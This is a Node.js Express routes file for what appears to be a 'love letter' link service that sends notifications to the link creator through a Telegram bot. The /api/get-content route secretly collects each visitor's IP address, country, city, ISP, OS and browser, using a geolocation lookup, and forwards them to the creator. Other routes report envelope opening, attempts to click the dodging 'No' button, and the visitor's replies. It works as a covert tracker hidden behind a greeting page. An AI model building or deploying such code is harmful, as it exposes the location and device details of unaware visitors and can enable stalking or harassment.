const express = require('express');
const path = require('path');
const axios = require('axios');
const UAParser = require('ua-parser-js');

function setupRoutes(app, db, saveDB, bot) {
    app.use(express.static(path.join(__dirname, '../')));

    app.get('/love/:id', (req, res) => {
        res.sendFile(path.join(__dirname, '../index.html'));
    });

    app.post('/api/get-content', async (req, res) => {
        const { id } = req.body;
        const linkData = db.linkDatabase[id];
        
        if (!linkData) {
            return res.json({ success: false });
        }

        let isLocked = false;
        if (linkData.countdown) {
            const targetTime = new Date(linkData.countdown).getTime();
            const now = new Date().getTime();
            if (now < targetTime) {
                isLocked = true;
            }
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
        const cleanIp = ip.split(',')[0].trim();
        const ua = req.headers['user-agent'] || '';
        const parser = new UAParser(ua);
        const result = parser.getResult();

        let country = 'Unknown';
        let city = 'Unknown';
        let isp = 'Unknown';

        try {
            if (cleanIp !== '127.0.0.1' && cleanIp !== '::1') {
                const geoRes = await axios.get(`http://ip-api.com/json/${cleanIp}`, { timeout: 2000 });
                if (geoRes.data && geoRes.data.status === 'success') {
                    country = geoRes.data.country || 'Unknown';
                    city = geoRes.data.city || 'Unknown';
                    isp = geoRes.data.isp || 'Unknown';
                }
            }
        } catch (e) {}

        const nowObj = new Date();
        const timeStr = nowObj.toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });

        const visitorInfo = {
            time: timeStr,
            ip: cleanIp,
            country: country,
            city: city,
            isp: isp,
            os: `${result.os.name || 'Unknown'} ${result.os.version || ''}`.trim(),
            browser: `${result.browser.name || 'Unknown'} ${result.browser.version || ''}`.trim()
        };

        if (!linkData.visitors) linkData.visitors = [];
        linkData.visitors.push(visitorInfo);
        await saveDB();

        bot.telegram.sendMessage(
            linkData.userId,
            `🔗 আপনার তৈরি করা লিংকে একটি ভিজিট পড়েছে!\n\n🌐 IP: ${cleanIp}\n🌍 Country: ${country}\n📱 Device: ${visitorInfo.os}\n🌐 Browser: ${visitorInfo.browser}`
        ).catch(() => {});

        res.json({
            success: true,
            theme: linkData.type || 'classic',
            music: linkData.music || '',
            image: linkData.image || '',
            animations: linkData.animations || [],
            letter: linkData.letter || '',
            buttonMovement: linkData.buttonMovement || false,
            isLocked: isLocked,
            countdownTime: linkData.countdown || null
        });
    });

    app.post('/api/open-envelope', async (req, res) => {
        const { id } = req.body;
        const linkData = db.linkDatabase[id];
        if (!linkData) return res.json({ success: false });

        bot.telegram.sendMessage(
            linkData.userId,
            `✉️ আপনার লিংকের খাম খোলা হয়েছে!`
        ).catch(() => {});

        res.json({ success: true });
    });

    app.post('/api/movement-status', async (req, res) => {
        const { id, status } = req.body;
        const linkData = db.linkDatabase[id];
        if (!linkData) return res.json({ success: false });

        if (status === 'moving' && !linkData.movementNotifId) {
            const sent = await bot.telegram.sendMessage(
                linkData.userId,
                `⚠️ ভিজিটর No বাটনে ক্লিক করার চেষ্টা করছে এবং বাটন মুভ করছে...`
            ).catch(() => null);
            if (sent) {
                linkData.movementNotifId = sent.message_id;
                await saveDB();
            }
        }
        res.json({ success: true });
    });

    app.post('/api/submit-answer', async (req, res) => {
        const { id, answer, message, movementCount, isNoClicked } = req.body;
        const linkData = db.linkDatabase[id];
        if (!linkData) return res.json({ success: false });

        linkData.answer = answer;
        if (movementCount !== undefined) linkData.movementCount = movementCount;

        if (linkData.movementNotifId) {
            await bot.telegram.deleteMessage(linkData.userId, linkData.movementNotifId).catch(() => {});
            linkData.movementNotifId = null;
        }

        let ansText = "";
        if (movementCount && movementCount > 0) {
            ansText = `🎯 ভিজিটর ${movementCount} বার No বাটন মুভমেন্ট করিয়েছে এবং চূড়ান্ত উত্তর দিয়েছে: ${answer}`;
        } else {
            ansText = `📩 ভিজিটরের চূড়ান্ত উত্তর: ${answer}`;
        }

        const sentAns = await bot.telegram.sendMessage(linkData.userId, ansText).catch(() => null);
        if (sentAns) {
            linkData.lastAnswerMsgId = sentAns.message_id;
        }

        if (message) {
            linkData.visitorMessage = message;
            if (linkData.lastAnswerMsgId) {
                await bot.telegram.deleteMessage(linkData.userId, linkData.lastAnswerMsgId).catch(() => {});
                linkData.lastAnswerMsgId = null;
            }
            await bot.telegram.sendMessage(
                linkData.userId,
                `💬 ভিজিটর একটি মেসেজ পাঠিয়েছে:\n\n${message}`
            ).catch(() => {});
        }

        await saveDB();
        res.json({ success: true });
    });
}

module.exports = { setupRoutes };
